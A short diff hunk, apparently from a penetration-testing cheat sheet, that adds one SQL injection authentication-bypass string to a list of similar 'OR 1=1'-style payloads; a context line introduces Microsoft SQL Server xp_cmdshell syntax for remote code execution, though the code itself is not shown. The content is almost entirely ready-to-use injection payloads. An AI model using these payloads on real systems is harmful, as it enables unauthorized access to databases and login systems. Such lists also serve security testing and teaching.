@@ -158,6 +158,7 @@ meh' OR 3=3;#
 meh' OR 2=2 LIMIT 1;#
 meh' OR 'a'='a
 meh' OR 1=1 --+
+' or 1=1 limit 1;# -- 
 ```
 Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on, here's syntax for remote code execution
 ```php
